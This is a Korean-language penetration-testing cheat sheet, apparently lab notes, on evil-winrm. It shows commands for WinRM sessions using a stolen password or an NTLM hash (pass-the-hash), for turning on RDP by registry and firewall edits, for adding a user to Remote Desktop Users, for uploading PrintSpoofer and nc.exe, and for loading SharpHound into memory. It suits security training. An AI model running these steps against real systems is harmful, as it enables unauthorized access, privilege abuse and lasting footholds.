# evil-winrm — 세션 유지·파일 전송·RDP 병행

- evil-winrm — WinRM(5985 HTTP / 5986 HTTPS)으로 PowerShell 세션을 여는 Ruby 클라이언트. 접속 유지가 안정적이고 upload/download 내장 명령으로 파일 전송까지 한 세션에서 처리된다.
- 유효한 계정 크리덴셜(패스워드·NTLM 해시)을 확보하고 5985 포트가 열려 있을 때 셸을 여는 표준 수단. RDP(3389)가 막혀 있거나 GUI가 필요 없는 작업에서 우선 시도한다.
- 타깃 5985/tcp 접근, Kali에 evil-winrm 설치, Remote Management Users 또는 Administrators 소속 계정이 필요하다. 기본 접속은 windows/evil_winrm.md를, 이 문서는 세션 유지·전송·RDP 병행 관점을 다룬다.

## 설치·기본 접속

```bash
apt update && apt install evil-winrm -y
# 또는 gem install evil-winrm

evil-winrm -i 192.168.243.180 -u mike -p 'Mike14'
```

- 접속에 성공하면 PowerShell 프롬프트가 떠서 한 세션을 오래 유지할 수 있다. 창 없는 텍스트 세션이라 xfreerdp보다 가볍고 끊김이 적다.

## 세션 유지 관점

```text
WinRM 세션                    RDP(xfreerdp) 세션
- 5985/tcp 단일 포트          - 3389/tcp 필요
- 텍스트 PowerShell           - GUI, 창 있는 프로그램 실행 가능
- 세션 끊김에 강함(요청 단위) - 네트워크 끊기면 세션 사라짐
- upload/download 내장        - 드라이브 리다이렉트로 전송
```

- 장시간 열거 작업(share 열거·registry 조회·스크립트 실행)은 WinRM 세션이 안정적이다.
- runas로 새 창을 띄우는 등 GUI가 꼭 필요한 작업만 RDP로 옮긴다. 둘은 대체재가 아니라 병행 수단이다.
- 3389가 닫혀 있는데 GUI가 필요하면: WinRM 세션에서 레지스트리로 RDP를 켠다.

```powershell
# WinRM 세션에서 RDP 활성화 (관리자 권한 필요)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
net localgroup "Remote Desktop Users" mike /add
```

## 파일 전송 — upload/download 내장 명령

```powershell
# WinRM 세션 내부에서
PS > upload PrintSpoofer64.exe C:\Temp\PrintSpoofer64.exe
PS > upload /home/kali/tools/nc.exe C:\Temp\nc.exe
PS > download C:\Users\mike\Desktop\flag.txt
PS > download C:\Users\mike\Documents\dump.txt /tmp/dump.txt
```

- upload <로컬경로> <원격경로>, download <원격경로> [로컬경로] 순서다. 로컬 경로는 evil-winrm을 실행한 Kali 머신 기준이다.
- http.server 없이 전송이 끝나는 것이 가장 큰 장점이다. 아웃바운드 HTTP가 막힌 환경에서 특히 유용하다.
- ls -la와 같은 파일 확인 후 `dir`로 원격 파일이 생겼는지 검증한다.

## 스크립트·실행 파일 로딩

```bash
evil-winrm -i 192.168.243.180 -u mike -p 'Mike14' -s /opt/scripts/ -e /opt/exes/
```

```text
PS > menu                                  # -s 경로의 .ps1 목록
PS > Invoke-Binary /opt/exes/SharpHound.exe  # .exe 메모리 로드
```

## Pass-the-Hash·TLS

```bash
evil-winrm -i 192.168.243.180 -u administrator -H <NTLM해시>
evil-winrm -i 192.168.243.180 -u administrator -S -P 5986
```

## 트러블슈팅

- 연결 거부는 5985가 닫혀 있다는 뜻이다. `nc -vz 192.168.243.180 5985`로 확인한다.
- 401 Unauthorized는 크리덴셜 문제 또는 계정이 Remote Management Users에 없는 경우다. 이때 RDP(3389)나 impacket psexec으로 전환한다.
- upload가 멈추면 대용량 파일일 가능성이 크다. 작은 파일부터 나눠 올리거나, 인코딩된 PowerShell iwr 전송으로 바꾼다.
- 3389·5985 둘 다 닫혀 있으면 열려 있는 다른 관리 포트(SMB 445 → psexec)로 우선 전환하고, WinRM 세션을 얻은 뒤 이 문서의 레지스트리 명령으로 RDP를 여는 순서도 가능하다.
- 기본 접속·옵션 전체는 windows/evil_winrm.md 참고.
